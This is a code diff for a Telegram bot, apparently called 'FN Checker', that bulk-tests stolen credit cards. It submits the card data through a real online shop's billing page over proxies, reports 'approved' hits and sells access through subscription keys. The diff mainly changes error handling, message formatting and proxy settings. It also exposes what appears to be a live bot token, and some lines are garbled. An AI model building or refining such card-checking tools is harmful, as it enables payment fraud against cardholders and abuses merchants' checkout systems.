@@ -30,7 +30,7 @@ TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAFmR3uuFuCw8_mY5ucOgVA-MQGN
 OWNER_ID = 7593550190  # Replace with your Telegram ID
 
 # Proxy settings
-PROXY = True
+PROXY = False
 try:
     with open('proxies.txt', 'r') as f:
         PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
@@ -118,7 +118,7 @@ def generate_code(length=32):
 async def get_bin_details(bin_number):
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", ssl=False) as response:
+            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                 if response.status == 200:
                     data = await response.json()
                     bank = data.get('bank', 'Unknown')
@@ -142,7 +142,6 @@ async def test_proxy(proxy_url):
                 proxy=proxy_url,
                 timeout=5,
                 headers={'user-agent': user},
-                ssl=False
             ) as response:
                 return response.status == 200
     except (aiohttp.ClientError, asyncio.TimeoutError):
@@ -227,7 +226,8 @@ async def check_cc(cc_details):
             }
             async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 if r.status != 200:
-                    logger.error(f"Address update failed with status {r.status}: {await r.text()}")
+                    response_text = await r.text()
+                    logger.error(f"Address update failed with status {r.status}: {response_text[:1000]}")
                     return {
                         'card': full, 'status': 'error', 'message': f'Address update failed: Status {r.status}',
                         'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
@@ -457,7 +457,7 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
                f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
-               f"[ϟ]�_C𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
+               f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
@@ -522,35 +522,38 @@ async def send_final_message(user_id, bulk_id, context):
     context.user_data['total'] = total
 
     hit_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
-    with open(hit_file, 'w') as f:
-        f.write('\n'.join(hits))
-    with open(hit_file, 'rb') as f:
-        keyboard = [
-            [InlineKeyboardButton(f"Approved✅: {approved}", callback_data='view_approved')],
-            [InlineKeyboardButton(f"Declined❌: {declined}", callback_data='view_declined')],
-            [InlineKeyboardButton(f"Total💳: {total}", callback_data='view_total')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await context.bot.send_document(
-            chat_id=progress['msg'].chat_id,
-            document=f,
-            caption=(
-                f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}\n"
-                f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
-                f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {approved + declined}/{total}\n"
-                f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
-                f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
-                f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
-                f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.2f}%%\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅𝐧 x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>"
-            ),
-            parse_mode='HTML',
-            reply_markup=reply_markup
-        )
-    os.remove(hit_file)
+    try:
+        with open(hit_file, 'w') as f:
+            f.write('\n'.join(hits))
+        with open(hit_file, 'rb') as f:
+            keyboard = [
+                [InlineKeyboardButton(f"Approved✅: {approved}", callback_data='view_approved')],
+                [InlineKeyboardButton(f"Declined❌: {declined}", callback_data='view_declined')],
+                [InlineKeyboardButton(f"Total💳: {total}", callback_data='view_total')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await context.bot.send_document(
+                chat_id=progress['msg'].chat_id,
+                document=f,
+                caption=(
+                    f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"[✪] �{A𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}\n"
+                    f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
+                    f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {approved + declined}/{total}\n"
+                    f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
+                    f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
+                    f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
+                    f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.2f}%\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>🚖!! ⏤‌𝐅𝐧 x 𝐄𝐥𝐞𝐜𝐭𝐫𝐚𓆪😈┃➤↯</a>"
+                ),
+                parse_mode='HTML',
+                reply_markup=reply_markup
+            )
+    finally:
+        if os.path.exists(hit_file):
+            os.remove(hit_file)
     del bulk_progress[bulk_id]
     user_queues[user_id].clear()
 
@@ -609,7 +612,7 @@ async def button_callback(update: Update, context):
         user_active_tasks[user_id].clear()
         if user_id in user_cooldowns:
             del user_cooldowns[user_id]
-        await query.message.reply_text("Checking Cancelled ❌")
+        await query.message.reply_text("Checking Cancelled")
     elif query.data == 'help':
         await query.message.reply_text("Use /chk to check a single CC or upload a text file for bulk checking.")
     elif query.data == 'view_approved':
@@ -641,13 +644,14 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("You don't have an active subscription. Please redeem a key with /redeem <key>.")
         return
 
-    file = await update.message.document.get_file()
     try:
+        file = await update.message.document.get_file()
         file_path = await file.download_to_drive()
         with open(file_path, 'r') as f:
             cc_list = [line.strip() for line in f.readlines() if len(line.strip().split('|')) == 4]
         os.remove(file_path)
     except Exception as e:
+        logger.error(f"Error processing file: {e}")
         await update.message.reply_text(f"Error processing file: {str(e)}")
         return
 
@@ -658,7 +662,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_checking[user_id] = False
     bulk_id = str(random.randint(100000, 999999))
     total = len(cc_list)
-    msg = await update.message.reply_text("🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...")
+    msg = await update.message.reply_text("🔎 Checking Cards...")
     bulk_progress[bulk_id] = {
         'total': total,
         'approved': 0,
@@ -680,21 +684,26 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     try:
-            tier, duration, quantity = context.args
-            duration = int(duration.replace('d', ''))
-            quantity = int(quantity)
-            if tier not in TIERS:
-                raise ValueError
+        tier, duration, quantity = context.args
+        duration = int(duration.replace('d', ''))
+        quantity = int(quantity)
+        if tier not in TIERS:
+            raise ValueError
     except ValueError:
-            await update.message.reply_text("Usage: /genkey <tier> <duration> <quantity>\nExample: /genkey Gold 1d 5")
-            return
+        await update.message.reply_text("Usage: /genkey <tier> <duration> <quantity>\nExample: /genkey Gold 1d 5")
+        return
 
+    try:
+        # Generate keys with proper indentation (8 spaces for try block)
         keys = [await generate_key(tier, duration) for _ in range(quantity)]
+        key_message = "\n".join([f"🔤 {key}\n   Plan: {tier} ({duration} days)" for key in keys])
         await update.message.reply_text(
-            f"✅ 𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝:\n{quantity} keys\n\n" +
-            '\n'.join([f"➔ {key}\nCode: {tier} ({duration} days)" for key in keys]) +
-            "\n\nFor Redeployment\nType: /redeem <key>"
+            f"✅ **Generated Keys**:\nQuantity: {quantity}\n\n{key_message}\n\n**To Redeem**:\nUse /redeem <key>",
+            parse_mode='Markdown'
         )
+    except Exception as e:
+        logger.error(f"Error generating keys: {e}")
+        await update.message.reply_text(f"Error generating keys: {str(e)}")
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
@@ -708,7 +717,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if result:
         tier, duration_days = result
         await update.message.reply_text(
-            f"🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬!\n\nYour 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 is now activated ✅\n\n𝐕𝐚𝐥𝐮𝐞: {tier} ({duration_days} days)\n\nThank you!"
+            f"🎉 **Congratulations!**\n\nYour subscription has been activated!\n\n**Tier**: {tier}\n**Duration**: {duration_days} days\n\nThank you!"
         )
     else:
         await update.message.reply_text("Invalid or already redeemed key.")
@@ -734,7 +743,7 @@ async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.from_user.id != OWNER_ID:
-        await update.message.reply_text("Invalid command ID")
+        await update.message.reply_text("Invalid command")
         return
 
     message = ' '.join(context.args)
